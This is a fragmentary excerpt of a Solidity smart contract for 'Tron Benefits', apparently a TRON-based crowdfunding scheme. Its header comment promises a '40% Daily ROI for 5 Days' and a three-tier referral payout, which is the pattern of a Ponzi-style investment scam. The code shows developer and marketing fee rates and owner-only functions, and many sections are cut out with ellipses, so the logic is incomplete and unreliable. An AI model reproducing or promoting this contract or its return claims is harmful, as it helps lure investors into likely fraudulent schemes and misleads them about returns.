//SourceUnit: TronBenefits.sol

/**
*
* Tron Benefits
*
* https://tronbenefits.com
* (only for tronbenefits.com Community)
* Crowdfunding And Investment Program: 40% Daily ROI for 5 Days.
* Referral Program
* 1st Level = 10%
* 2nd Level = 5%
* 3rd Level = 3%
...
contract TronBenefits is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 100;           // 10% Team, Operation & Development
    uint256 public constant MARKETING_RATE = 100;           // 10% Marketing
    ...
    uint256 public constant PLAN_TERM = 5 days;             // 5 Days
	...
	function getUID(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }
    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
     ...
     function addressCode(address _contractAddress) public pure returns (bytes32 hash)
    {
	...
	function CalculateReinvestments(uint _newValue) public  returns(bool)
    {
